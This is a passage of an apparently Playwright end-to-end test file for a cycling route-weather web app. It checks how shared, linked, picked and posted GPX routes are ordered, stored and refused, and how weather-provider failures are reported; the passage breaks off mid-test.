    window.__ended = {};
    const request = window.cw.requestRoute;
    window.cw.requestRoute = (args) => request(args).then((s) => { window.__ended[args.source] = s; return s; });
    window.__enqueue({ name: 'shared.gpx', gpx: text });
    await window.cwConsumePendingShare();
    window.loadRecentRoute(window.getRecentRoutes()[0]);
  }, routeAt('Compartida', 40.42));

  await expect.poll(() => page.evaluate(() => window.__ended)).toEqual({ 'share-native': 'superseded', recent: 'committed' });
  await expect(routeName(page)).toContainText('Masnou');
  await page.evaluate(() => window.__openImport[0]());
  await expect.poll(() => storedNames(page)).toEqual(['route.gpx', 'shared.gpx']);
  await page.waitForTimeout(300);
  await expect(routeName(page)).toContainText('Masnou');
});

// Spec §6. Imports run one at a time, so the gates cannot really open out of order; opening them
// last to first still proves the order comes from arrival, not from which write is let through.
test('four shared routes in a row: the fourth is shown and the last three to arrive are kept, none over another', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await holdImports(page, 4);
  const routes = [
    { name: 'a.gpx', gpx: routeAt('Primera', 41.48) },
    { name: 'Ruta.gpx', gpx: routeAt('Segunda', 41.2) },
    { name: 'Ruta.gpx', gpx: routeAt('Tercera', 40.9) },
    { name: 'd.gpx', gpx: routeAt('Cuarta', 40.42) },
  ];
  await page.evaluate((all) => { all.forEach((r) => window.__enqueue(r)); return window.cwConsumePendingShare(); }, routes);
  for (const i of [3, 2, 1, 0]) {
    await page.evaluate((k) => window.__openImport[k](), i);
    await page.waitForTimeout(100);
  }

  await expect.poll(() => storedNames(page)).toEqual(['Ruta (2).gpx', 'Ruta.gpx', 'd.gpx']);
  const stored = await storedRoutes(page);
  expect(new Set(stored.map((r) => r.fingerprint)).size).toBe(3);
  await expect(routeName(page)).toHaveText('Cuarta');
  expect(await page.evaluate(() => window.lastGPXFile.name)).toBe('d.gpx');
});

/* The service worker's slot: one route in IndexedDB (cw_shared_db, store files, key gpx), and a
   cw-shared-gpx message once it is written. The test's own reads and writes set __slotBypass so
   the holds below never catch them. */

const slotOp = (page, write) =>
  page.evaluate((w) => new Promise((resolve, reject) => {
    window.__slotBypass = true;
    const open = indexedDB.open('cw_shared_db', 1);
    window.__slotBypass = false;
    open.onupgradeneeded = () => open.result.createObjectStore('files');
    open.onerror = () => reject(open.error);
    open.onsuccess = () => {
      window.__slotBypass = true;
      const tx = open.result.transaction('files', w ? 'readwrite' : 'readonly');
      window.__slotBypass = false;
      const store = tx.objectStore('files');
      let value = null;
      if (w) store.put({ text: w.text, name: w.name, ts: Date.now() }, 'gpx');
      else store.get('gpx').onsuccess = (ev) => { value = ev.target.result ? ev.target.result.name : null; };
      tx.oncomplete = () => { open.result.close(); resolve(value); };
      tx.onerror = () => reject(tx.error);
    };
  }), write || null);
const writeSlot = (page, text, name) => slotOp(page, { text, name });
const slotName = (page) => slotOp(page, null);
const swAnnounces = (page) =>
  page.evaluate(() => navigator.serviceWorker.dispatchEvent(new MessageEvent('message', { data: { type: 'cw-shared-gpx' } })));

/** From the next page load, every route from outside that reaches the import is listed by name
 *  in __received. */
const listReceived = (page) =>
  page.addInitScript(() => {
    window.__received = [];
    let real;
    Object.defineProperty(window, 'cwImportIfRoute', {
      configurable: true,
      set(v) { real = v; },
      get() { return (text, name) => { window.__received.push(name); return real(text, name); }; },
    });
  });

test('a route the service worker announces while the start-up read of its slot is held is not lost, and arrives after that one', async ({ page }) => {
  await goOffline(page);
  await page.goto('/help.html');
  await writeSlot(page, routeAt('Primera', 41.48), 'first.gpx');
  await listReceived(page);
  // The first transaction on the slot has read and deleted its route; its answer waits for the test.
  await page.addInitScript(() => {
    let open;
    const gate = new Promise((r) => { open = r; });
    window.__openSlot = open;
    const transaction = IDBDatabase.prototype.transaction;
    IDBDatabase.prototype.transaction = function (...args) {
      const tx = transaction.apply(this, args);
      if (this.name !== 'cw_shared_db' || window.__slotBypass || window.__slotHeld) return tx;
      window.__slotHeld = true;
      let handler = null;
      Object.defineProperty(tx, 'oncomplete', { configurable: true, get: () => handler, set: (fn) => { handler = fn; } });
      tx.addEventListener('complete', (ev) => { gate.then(() => handler && handler.call(tx, ev)); });
      return tx;
    };
  });
  await page.goto('/index.html');
  await mapReady(page);
  await expect.poll(() => page.evaluate(() => !!window.__slotHeld)).toBe(true);

  await writeSlot(page, routeAt('Segunda', 40.42), 'second.gpx');
  await swAnnounces(page);
  await page.waitForTimeout(300);
  await page.evaluate(() => window.__openSlot());

  await expect(routeName(page)).toHaveText('Segunda');
  expect(await slotName(page)).toBe(null);
  expect(await page.evaluate(() => window.__received)).toEqual(['first.gpx', 'second.gpx']);
});

test('a route in the service worker slot is received once, however many messages announce it', async ({ page }) => {
  await listReceived(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.waitForTimeout(500);   // the start-up read of the empty slot is over
  // Every open of the slot from here on is answered when the test says, the last one first.
  await page.evaluate(() => {
    window.__heldOpens = [];
    const real = IDBFactory.prototype.open;
    IDBFactory.prototype.open = function (name, ...rest) {
      const req = real.call(this, name, ...rest);
      if (name !== 'cw_shared_db' || window.__slotBypass) return req;
      let handler = null;
      Object.defineProperty(req, 'onsuccess', { configurable: true, get: () => handler, set: (fn) => { handler = fn; } });
      req.addEventListener('success', (ev) => { window.__heldOpens.push(() => handler && handler.call(req, ev)); });
      return req;
    };
  });

  await writeSlot(page, routeAt('Tercera', 41.48), 'third.gpx');
  await swAnnounces(page);
  await swAnnounces(page);
  await page.waitForTimeout(300);
  // Last open first, each let its microtasks run (so a read waiting on the open starts its
  // transaction) before the next is answered: two reads then both find the route unless each
  // reads and deletes in one transaction, one at a time.
  await page.evaluate(async () => {
    while (window.__heldOpens.length) {
      window.__heldOpens.pop()();
      for (let i = 0; i < 10; i++) await Promise.resolve();
    }
  });

  await expect(routeName(page)).toHaveText('Tercera');
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.__received)).toEqual(['third.gpx']);
  expect(await slotName(page)).toBe(null);
});

test('a route handed over in sessionStorage is shown, kept among recent routes and taken out of sessionStorage', async ({ page }) => {
  await goOffline(page);
  await page.goto('/help.html');
  await page.evaluate((text) => {
    sessionStorage.setItem('cw_gpx_text', text);
    sessionStorage.setItem('cw_gpx_name', 'handed.gpx');
  }, routeAt('Traspasada', 41.48));
  await page.goto('/index.html');
  await mapReady(page);

  await expect(routeName(page)).toHaveText('Traspasada');
  await expect.poll(() => storedNames(page)).toEqual(['handed.gpx']);
  expect(await page.evaluate(() => [sessionStorage.getItem('cw_gpx_text'), sessionStorage.getItem('cw_gpx_name')]))
    .toEqual([null, null]);
});

// The start-up read of the slot asked for its route only once IndexedDB answered, after the link
// in the address had asked for its own, so a route left in the slot by an earlier share was the
// later request and replaced the link the user had just opened.
for (const [what, address] of [['?gpx_url=', '/index.html?gpx_url=/hosted.gpx&name=hosted.gpx'], ['shared_id', '/index.html?shared_id=abc']]) {
  test(`a route left in the service worker slot does not replace a ${what} opened at start-up, and is still kept`, async ({ page }) => {
    await goOffline(page);
    await page.route((url) => url.pathname === '/hosted.gpx' || url.pathname === '/shared/abc', (route) =>
      (route.request().method() === 'DELETE'
        ? route.fulfill({ status: 204 })
        : route.fulfill({ status: 200, contentType: 'application/gpx+xml', body: routeAt('Enlace', 41.48) })));
    await page.goto('/help.html');
    await writeSlot(page, routeAt('Antigua', 40.42), 'old.gpx');
    await page.goto(address);
    await mapReady(page);

    await expect(routeName(page)).toHaveText('Enlace');
    await expect.poll(() => storedNames(page)).toEqual([what === 'shared_id' ? 'shared_abc.gpx' : 'hosted.gpx', 'old.gpx'].sort());
    await page.waitForTimeout(500);
    await expect(routeName(page)).toHaveText('Enlace');
    expect(await slotName(page)).toBe(null);
  });
}

// ?shared_id= with nothing after the "=" asks the server for no route: loadSharedIdIfPresent
// bails out on an empty value. The start-up slot read must agree, or a route left in the slot
// is only kept among recent routes and the screen stays empty despite the link in the address.
test('a route left in the service worker slot is shown when shared_id in the address is empty', async ({ page }) => {
  await goOffline(page);
  await page.goto('/help.html');
  await writeSlot(page, routeAt('Antigua', 40.42), 'old.gpx');
  await page.goto('/index.html?shared_id=');
  await mapReady(page);

  await expect(routeName(page)).toHaveText('Antigua');
  await expect.poll(() => storedNames(page)).toEqual(['old.gpx']);
  expect(await slotName(page)).toBe(null);
});

// The start-up read of the service worker's slot also ran in the app, which has no service
// worker, and created the slot's database there for nothing.
test('the app never opens the service worker slot', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.waitForTimeout(500);
  expect(await page.evaluate(async () => (await indexedDB.databases()).map((d) => d.name))).not.toContain('cw_shared_db');
});

test('a service worker slot whose transaction cannot start is closed again', async ({ page }) => {
  await page.addInitScript(() => {
    window.__slotClosed = 0;
    const transaction = IDBDatabase.prototype.transaction;
    IDBDatabase.prototype.transaction = function (...args) {
      if (this.name === 'cw_shared_db') throw new DOMException('broken', 'InvalidStateError');
      return transaction.apply(this, args);
    };
    const close = IDBDatabase.prototype.close;
    IDBDatabase.prototype.close = function () {
      if (this.name === 'cw_shared_db') window.__slotClosed++;
      return close.call(this);
    };
  });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await expect.poll(() => page.evaluate(() => window.__slotClosed)).toBe(1);
});

// A throw after the inbox had handed over a route used to report that nothing arrived, so the
// map went to the phone's position over the shared route.
test('an inbox that fails after handing over a route still reports that one arrived', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  expect(await page.evaluate((text) => {
    window.__enqueue({ name: 'shared.gpx', gpx: text });
    const share = window.Capacitor.Plugins.MeteoRideShare;
    const consume = share.consumePending;
    let calls = 0;
    share.consumePending = async () => { if (calls++ > 0) throw new Error('inbox broke'); return consume(); };
    return window.cwConsumePendingShare();
  }, routeAt('Compartida', 40.42))).toBe(true);
  await expect(routeName(page)).toHaveText('Compartida');
});

/** From the next page load, every route request is listed in __statuses as {source, status} once
 *  it ends. */
const recordStatuses = (page) =>
  page.addInitScript(() => {
    window.__statuses = [];
    const cw = (window.cw = window.cw || {});
    let real;
    Object.defineProperty(cw, 'requestRoute', {
      configurable: true,
      enumerable: true,
      set(v) { real = v; },
      get() {
        return (args) => {
          const ended = real(args);
          ended.then((status) => window.__statuses.push({ source: args.source, status }));
          return ended;
        };
      },
    });
  });

/** Answers GETs of `pathname` with `body` only once the test calls the function this returns;
 *  every DELETE of it is listed in `deletes`. */
async function holdDownload(page, pathname, body, deletes = []) {
  let release;
  const held = new Promise((r) => { release = r; });
  await page.route((url) => url.pathname === pathname, async (route) => {
    if (route.request().method() === 'DELETE') {
      deletes.push(pathname);
      return route.fulfill({ status: 204 });
    }
    await held;
    return route.fulfill({ status: 200, contentType: 'application/gpx+xml', body });
  });
  return release;
}

// The download used to come before the request, so a file picked while it downloaded was the
// earlier request and lost to the link, which was kept among recent routes as well.
test('a ?gpx_url= still downloading when a file is picked loses to the file, and is not kept among recent routes', async ({ page }) => {
  await goOffline(page);
  const release = await holdDownload(page, '/hosted.gpx', routeAt('Enlace', 41.48));
  await page.goto('/index.html?gpx_url=/hosted.gpx&name=hosted.gpx');
  await mapReady(page);
  await expect.poll(() => page.evaluate(() => window.cw.hasRouteRequests()), 'the link asked before its download').toBe(true);

  await pickText(page, 'picked.gpx', routeAt('Elegida', 40.42));
  await expect(routeName(page)).toHaveText('Elegida');
  release();
  await page.waitForTimeout(800);
  await expect(routeName(page)).toHaveText('Elegida');
  await importsDone(page);
  expect(await storedNames(page)).toEqual(['picked.gpx']);
});

test('a ?gpx_url= route that is confirmed is kept among recent routes under its name', async ({ page }) => {
  await goOffline(page);
  await page.route((url) => url.pathname === '/hosted.gpx',
    (route) => route.fulfill({ status: 200, contentType: 'application/gpx+xml', body: routeAt('Enlace', 41.48) }));
  await page.goto('/index.html?gpx_url=/hosted.gpx&name=hosted.gpx');
  await mapReady(page);
  await expect(routeName(page)).toHaveText('Enlace');
  await expect.poll(() => storedNames(page)).toEqual(['hosted.gpx']);
});

test('a shared_id still downloading when a file is picked loses to the file, is still kept once its text arrives, and is deleted from the server', async ({ page }) => {
  await goOffline(page);
  const deletes = [];
  const release = await holdDownload(page, '/shared/abc', routeAt('Servidor', 41.48), deletes);
  await page.goto('/index.html?shared_id=abc');
  await mapReady(page);
  await expect.poll(() => page.evaluate(() => window.cw.hasRouteRequests()), 'shared_id asked before its download').toBe(true);

  await pickText(page, 'picked.gpx', routeAt('Elegida', 40.42));
  await expect(routeName(page)).toHaveText('Elegida');
  release();
  await expect.poll(() => storedNames(page)).toEqual(['picked.gpx', 'shared_abc.gpx']);
  await expect.poll(() => deletes).toEqual(['/shared/abc']);
  await page.waitForTimeout(300);
  await expect(routeName(page)).toHaveText('Elegida');
});

// A used share link kept its shared_id, so reloading it asked the server again for a copy already
// deleted, and showed a read failure over an empty page.
test('a shared_id whose route arrived is taken out of the address, so a reload does not ask for it again', async ({ page }) => {
  await goOffline(page);
  const gets = [];
  await page.route((url) => url.pathname === '/shared/abc', (route) => {
    if (route.request().method() === 'DELETE') return route.fulfill({ status: 204 });
    gets.push(route.request().url());
    return route.fulfill({ status: 200, contentType: 'application/gpx+xml', body: routeAt('Servidor', 41.48) });
  });
  await page.goto('/index.html?shared_id=abc&foo=1#top');
  await mapReady(page);
  await expect(routeName(page)).toHaveText('Servidor');
  expect(await page.evaluate(() => [location.pathname, location.search, location.hash])).toEqual(['/index.html', '?foo=1', '#top']);

  await page.reload();
  await mapReady(page);
  await page.waitForTimeout(500);
  expect(gets).toHaveLength(1);
});

// A body with no route in it used to count as arrived: the server copy was deleted and shared_id
// left the address before the empty text was refused, so nothing was shown and a reload could
// not try again.
for (const [what, answer] of [
  ['is gone', (route) => route.fulfill({ status: 404, contentType: 'text/plain', body: 'not found' })],
  ['cannot be reached', (route) => route.abort()],
  ['comes back empty', (route) => route.fulfill({ status: 200, contentType: 'application/gpx+xml', body: '' })],
  ['comes back blank', (route) => route.fulfill({ status: 200, contentType: 'application/gpx+xml', body: ' \n\t ' })],
]) {
  test(`a shared_id whose server copy ${what} fails with the read notice, keeps nothing and stays in the address`, async ({ page }) => {
    await recordNotices(page);
    await recordStatuses(page);
    await goOffline(page);
    const deletes = [];
    await page.route((url) => url.pathname === '/shared/abc', (route) => {
      if (route.request().method() !== 'DELETE') return answer(route);
      deletes.push(route.request().url());
      return route.fulfill({ status: 204 });
    });
    await page.goto('/index.html?shared_id=abc');
    await mapReady(page);

    await expect.poll(() => page.evaluate(() => window.__statuses)).toEqual([{ source: 'shared-id', status: 'failed' }]);
    const readFailed = await page.evaluate(() => window.t('route_read_failed'));
    expect(await page.evaluate(() => window.__notices)).toContain(readFailed);
    await importsDone(page);
    expect(await storedRoutes(page)).toEqual([]);
    expect(deletes, 'deleted a server copy that handed over no route').toEqual([]);
    expect(await page.evaluate(() => location.search), 'the link can no longer be retried').toBe('?shared_id=abc');
  });
}

test('a shared_id is shown and kept without waiting for its server copy to be deleted', async ({ page }) => {
  await recordStatuses(page);
  await goOffline(page);
  let releaseDelete;
  const deleteHeld = new Promise((r) => { releaseDelete = r; });
  const deletes = [];
  await page.route((url) => url.pathname === '/shared/abc', async (route) => {
    if (route.request().method() !== 'DELETE') {
      return route.fulfill({ status: 200, contentType: 'application/gpx+xml', body: routeAt('Servidor', 41.48) });
    }
    deletes.push(route.request().url());
    await deleteHeld;
    return route.fulfill({ status: 204 });
  });
  await page.goto('/index.html?shared_id=abc');
  await mapReady(page);

  await expect.poll(() => page.evaluate(() => window.__statuses)).toEqual([{ source: 'shared-id', status: 'committed' }]);
  await expect.poll(() => storedNames(page)).toEqual(['shared_abc.gpx']);
  expect(deletes).toHaveLength(1);
  releaseDelete();
});

// Keeping happens as the text arrives, so nothing after that undoes it: not a DELETE that fails,
// not a request that runs out of time because the map never came.
test('a shared_id whose text arrived is kept when deleting its server copy fails and its request runs out of time', async ({ page }) => {
  await page.clock.install();
  await holdMap(page);
  await recordStatuses(page);
  await goOffline(page);
  await page.route((url) => url.pathname === '/shared/abc', (route) =>
    (route.request().method() === 'DELETE'
      ? route.abort()
      : route.fulfill({ status: 200, contentType: 'application/gpx+xml', body: routeAt('Servidor', 41.48) })));
  await page.goto('/index.html?shared_id=abc');
  await expect.poll(() => storedNames(page)).toEqual(['shared_abc.gpx']);
  expect(await page.evaluate(() => window.__statuses), 'ended before its deadline').toEqual([]);

  await page.clock.fastForward(31000);
  await expect.poll(() => page.evaluate(() => window.__statuses)).toEqual([{ source: 'shared-id', status: 'failed' }]);
  await importsDone(page);
  expect(await storedNames(page)).toEqual(['shared_abc.gpx']);
});

// In the test above the text arrives before the deadline. Here the request has already failed
// when it arrives, and the route is still kept: keeping does not wait on the request.
test('a shared_id whose text arrives after its request ran out of time is still kept, and not shown', async ({ page }) => {
  await page.clock.install();
  await recordNotices(page);
  await recordStatuses(page);
  await goOffline(page);
  const release = await holdDownload(page, '/shared/abc', routeAt('Servidor', 41.48));
  await page.goto('/index.html?shared_id=abc');
  await mapReady(page);
  await expect.poll(() => page.evaluate(() => window.cw.hasRouteRequests()), 'shared_id asked before its download').toBe(true);

  await page.clock.fastForward(31000);
  await expect.poll(() => page.evaluate(() => window.__statuses)).toEqual([{ source: 'shared-id', status: 'failed' }]);
  const readFailed = await page.evaluate(() => window.t('route_read_failed'));
  expect(await page.evaluate(() => window.__notices)).toContain(readFailed);
  await importsDone(page);
  expect(await storedRoutes(page), 'kept before its text arrived').toEqual([]);

  release();
  await expect.poll(() => storedNames(page)).toEqual(['shared_abc.gpx']);
  expect(await page.evaluate(() => window.lastGPXFile)).toBe(null);
});

// On the website nothing can be on screen before the link's request, which is made as the page
// loads, so "leaves the screen alone" is an empty screen here.
test('a ?gpx_url= that is not a GPX fails with a notice and puts nothing on screen or among recent routes', async ({ page }) => {
  await recordNotices(page);
  await goOffline(page);
  await page.route((url) => url.pathname === '/login.html',
    (route) => route.fulfill({ status: 200, contentType: 'text/html', body: '<html><body>Log in</body></html>' }));
  await page.goto('/index.html?gpx_url=/login.html');
  await mapReady(page);
  const readFailed = await page.evaluate(() => window.t('route_read_failed'));
  await expect.poll(() => page.evaluate(() => window.__notices)).toContain(readFailed);

  expect(await page.evaluate(() => window.lastGPXFile)).toBe(null);
  await expect(trackDrawn(page)).toHaveCount(0);
  await importsDone(page);
  expect(await storedRoutes(page)).toEqual([]);
});

// A request replaced in the same tick never reads, and a link is kept only once confirmed, so
// nothing else waits on its download: one that fails must not surface as an unhandled rejection.
test('a link replaced before it reads whose download fails leaves nothing unhandled', async ({ page }) => {
  const crashes = [];
  page.on('pageerror', (e) => crashes.push(e.message));
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  const statuses = await page.evaluate((text) => Promise.all([
    window.cwReceiveRoute({ source: 'url', name: 'down.gpx', fetchText: () => Promise.reject(new Error('download failed')) }),
    window.cwInjectGPXFromText(text, 'shared.gpx'),
  ]), routeAt('Compartida', 41.48));
  expect(statuses).toEqual(['superseded', 'committed']);
  await page.waitForTimeout(300);
  expect(crashes).toEqual([]);
});

/** Posts a route to the page as a trusted site would. Every answer lands in __acks, with the
 *  route on screen when it arrived. */
const postRoute = (page, gpx, name) =>
  page.evaluate(([g, n]) => {
    if (!window.__acks) {
      window.__acks = [];
      window.addEventListener('message', (ev) => {
        if (ev.data && ev.data.action === 'loadGPX:ack') {
          window.__acks.push({ ...ev.data, onScreen: window.lastGPXFile ? window.lastGPXFile.name : null });
        }
      });
    }
    window.postMessage({ action: 'loadGPX', gpx: g, name: n }, window.location.origin);
  }, [gpx, name]);
const acks = (page) => page.evaluate(() => window.__acks || []);

// The answer used to be ok: true as soon as the message arrived, before anything was known.
test('a posted route is answered once it is confirmed, with what its request ended as', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  const route = routeAt('Mensaje', 41.48);
  await postRoute(page, route, 'posted.gpx');

  await expect.poll(() => acks(page)).toEqual([
    { action: 'loadGPX:ack', ok: true, status: 'committed', name: 'posted.gpx', size: route.length, onScreen: 'posted.gpx' },
  ]);
  await expect.poll(() => storedNames(page)).toEqual(['posted.gpx']);
});

// Senders resend: the userscript posts the same route at 1, 2 and 4 s, and the answer waits for
// the route to be confirmed, so a resend can land after the route is shown. It was a newer
// request, and replaced a file the user had picked in between.
test('a posted route sent again within 30 s is answered with the first result and does not replace a file picked since', async ({ page }) => {
  await page.clock.install();
  await recordStatuses(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  const route = routeAt('Mensaje', 41.48);
  const messages = () => page.evaluate(() => window.__statuses.filter((s) => s.source === 'message').length);
  await postRoute(page, route, 'posted.gpx');
  await expect.poll(() => acks(page)).toEqual([expect.objectContaining({ status: 'committed', onScreen: 'posted.gpx' })]);

  await pickText(page, 'picked.gpx', routeAt('Elegida', 40.42));
  await expect(routeName(page)).toHaveText('Elegida');
  await postRoute(page, route, 'posted.gpx');
  await expect.poll(() => acks(page)).toHaveLength(2);
  expect((await acks(page))[1]).toEqual(
    { action: 'loadGPX:ack', ok: true, status: 'committed', name: 'posted.gpx', size: route.length, onScreen: 'picked.gpx' });
  await page.waitForTimeout(500);
  await expect(routeName(page)).toHaveText('Elegida');
  expect(await messages(), 'the resend asked for its route again').toBe(1);

  // Past the window the same route is a request of its own again.
  await page.clock.fastForward(31000);
  await postRoute(page, route, 'posted.gpx');
  await expect.poll(() => acks(page)).toHaveLength(3);
  await expect(routeName(page)).toHaveText('Mensaje');
  expect(await messages()).toBe(2);

  // So is the same route from another allowed origin within the window. The browser sets a real
  // message's origin, so this one is dispatched by hand; its answer goes to an origin this page
  // is not, and is dropped, so only its request is observable.
  await pickText(page, 'picked.gpx', routeAt('Elegida', 40.42));
  await expect(routeName(page)).toHaveText('Elegida');
  await page.evaluate((g) => window.dispatchEvent(new MessageEvent('message',
    { data: { action: 'loadGPX', gpx: g, name: 'posted.gpx' }, origin: 'http://localhost:4173', source: window })), route);
  await expect(routeName(page)).toHaveText('Mensaje');
  await expect.poll(messages).toBe(3);
});

test('a posted text with no track is answered as failed and stays out of recent routes', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await postRoute(page, '<gpx version="1.1" xmlns="http://www.topografix.com/GPX/1/1"></gpx>', 'empty.gpx');

  await expect.poll(() => acks(page)).toEqual([expect.objectContaining({ ok: false, status: 'failed', name: 'empty.gpx' })]);
  await importsDone(page);
  expect(await storedRoutes(page)).toEqual([]);
});

test('a posted route replaced by a file picked before the map is ready is answered as superseded, and not kept', async ({ page }) => {
  await holdMap(page);
  await goOffline(page);
  await page.goto('/index.html');
  await postRoute(page, routeAt('Mensaje', 41.48), 'posted.gpx');
  await expect.poll(() => page.evaluate(() => window.cw.hasRouteRequests())).toBe(true);
  await requestHeld(page, 'pick');

  await page.evaluate(() => window.__openMap());
  await mapReady(page);
  await openRead(page, 'pick', routeAt('Elegida', 40.42), 'picked.gpx');
  await expect.poll(() => acks(page)).toEqual([expect.objectContaining({ ok: false, status: 'superseded', name: 'posted.gpx' })]);
  await expect.poll(() => requestStatus(page, 'pick')).toBe('committed');
  await importsDone(page);
  expect(await storedRoutes(page)).toEqual([]);
});

// The browser sets a message's origin, so the app posts to itself from an origin the allowlist
// does not name: a made-up https host whose every request the test fetches from the test server.
// A foreign site framing the app does not work here: the app's CSP keeps foreign frames out, and
// Chromium's local network access checks stop a page on another hostname from framing 127.0.0.1.
test('a route posted from an origin that is not allowed is refused, asks for nothing and keeps nothing', async ({ page, baseURL }) => {
  const foreign = 'https://foreign.example';
  await page.route('**/*', async (route) => {
    const url = new URL(route.request().url());
    if (url.origin !== foreign) return route.abort();
    return route.fulfill({ response: await route.fetch({ url: new URL(url.pathname + url.search, baseURL).href }) });
  });
  await page.goto(`${foreign}/index.html`);
  await mapReady(page);
  expect(await page.evaluate(() => location.origin)).toBe(foreign);

  await postRoute(page, routeAt('Ajena', 41.48), 'foreign.gpx');
  await expect.poll(() => acks(page)).toEqual([{ action: 'loadGPX:ack', ok: false, reason: 'forbidden_origin', onScreen: null }]);
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.cw.hasRouteRequests())).toBe(false);
  await importsDone(page);
  expect(await storedRoutes(page)).toEqual([]);
});

// Posting used to confirm straight away: before the map existed the commit threw, leaving the
// name on screen with no track.
test('a route posted before the map exists is drawn once the map is ready, and only then answered', async ({ page }) => {
  await holdMap(page);
  await goOffline(page);
  await page.goto('/index.html');
  await postRoute(page, routeAt('Temprana', 41.48), 'early.gpx');
  await page.waitForTimeout(300);
  expect(await acks(page), 'answered before anything was decided').toEqual([]);

  await page.evaluate(() => window.__openMap());
  await mapReady(page);
  await expect(routeName(page)).toHaveText('Temprana');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  await expect.poll(() => acks(page)).toEqual([expect.objectContaining({ ok: true, status: 'committed', onScreen: 'early.gpx' })]);
});

// Two app-only buttons pushed the toolbar onto a second line at phone width. Any
// future one should fail here rather than in a screenshot nobody takes.
test('the app toolbar stays on one line', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  // Buttons differ in height, so their top edges do not line up even on one row.
  // A wrapped toolbar is taller than its tallest button; an unwrapped one is not.
  const { navHeight, tallestButton, count } = await page.evaluate(() => {
    const nav = document.querySelector('header nav');
    const buttons = [...nav.querySelectorAll('button')].filter((b) => b.offsetParent !== null);
    return {
      navHeight: nav.getBoundingClientRect().height,
      tallestButton: Math.max(...buttons.map((b) => b.getBoundingClientRect().height)),
      count: buttons.length,
    };
  });

  expect(count, 'expected the app toolbar to carry both extra buttons').toBeGreaterThan(4);
  expect(navHeight, `toolbar is ${navHeight}px tall for a ${tallestButton}px button, so it wrapped`)
    .toBeLessThan(tallestButton * 1.5);
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
});

test('an empty table says why', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await stubProvider(page, control);
  await page.goto('/index.html');
  await mapReady(page);

  // The provider is unreachable and nothing is cached, which used to render an
  // empty table with no explanation at all.
  control.offline = true;
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(page.locator('.notice')).toContainText(/not responding|no responde/);
  expect(await shownTemperatures(page)).toEqual([]);
});

test('a provider that recovers through the chain says nothing', async ({ page }) => {
  // First call fails, the rest succeed: that is a working run, not an error.
  let calls = 0;
  await page.route(
    (url) => url.hostname === 'api.open-meteo.com',
    (route) => {
      calls += 1;
      return calls === 1
        ? route.abort()
        : route.fulfill({
            status: 200,
            contentType: 'application/json',
            body: JSON.stringify(forecastAt(21)),
          });
    }
  );
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await page.waitForTimeout(2000);   // past the window the warning would fire in
  await expect(page.locator('.notice')).not.toContainText(/not responding|no responde/);
});

test('a rejected API key is named as such', async ({ page }) => {
  await page.route((url) => url.hostname === 'api.open-meteo.com', (route) =>
    route.fulfill({ status: 401, contentType: 'application/json', body: '{"error":true}' })
  );
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect(page.locator('.notice')).toContainText(/API key/);
});

// Each computation hands fetch its own recorder, and the wrapper in utils.js notes the
// provider answers there and nowhere else. A request without one is not watched.
test('a provider request carrying a recorder notes its outcome there', async ({ page }) => {
  await page.route((url) => url.hostname === 'api.open-meteo.com', (route) => {
    const kind = new URL(route.request().url()).searchParams.get('case');
    if (kind === 'down') return route.abort();
    return route.fulfill({ status: kind === 'key' ? 401 : 200, contentType: 'application/json', body: '{}' });
  });
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
  await page.goto('/index.html');
  await mapReady(page);
  const recorded = await page.evaluate(async () => {
    const rec = window.cw.utils.createRecorder();
    const base = 'https://api.open-meteo.com/v1/forecast?case=';
    await fetch(base + 'ok', { cwRecorder: rec });
    await fetch(base + 'down', { cwRecorder: rec }).catch(() => {});
    await fetch(base + 'key', { cwRecorder: rec });
    await fetch(base + 'key');   // no recorder: noted nowhere
    return rec;
  });
  expect(recorded).toEqual({ ok: 1, failed: 2, lastFailStatus: '401', staleAgeMs: 0, offline: false });
});

// Whether a failure happened without connection is noted when it happens: by the time
// the computation publishes, the connection may be back and navigator.onLine says so.
test('a provider request that fails without connection notes it in the recorder', async ({ page }) => {
  await page.addInitScript(() => {
    window.__offline = false;
    Object.defineProperty(navigator, 'onLine', { get: () => !window.__offline, configurable: true });
  });
  await page.route((url) => url.hostname === 'api.open-meteo.com', (route) => route.abort());
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
  await page.goto('/index.html');
  await mapReady(page);
  const seen = await page.evaluate(async () => {
    const url = 'https://api.open-meteo.com/v1/forecast?case=down';
    const online = window.cw.utils.createRecorder();
    await fetch(url, { cwRecorder: online }).catch(() => {});
    window.__offline = true;
    const offline = window.cw.utils.createRecorder();
    await fetch(url, { cwRecorder: offline }).catch(() => {});
    window.__offline = false;
    return { online: online.offline, offline: offline.offline };
  });
  expect(seen).toEqual({ online: false, offline: true });
});

test('a stale cache read without connection notes its age in the recorder', async ({ page }) => {
  await goOffline(page);
  await page.addInitScript(() => Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true }));
  await page.goto('/index.html');
  await mapReady(page);
  const read = await page.evaluate(() => {
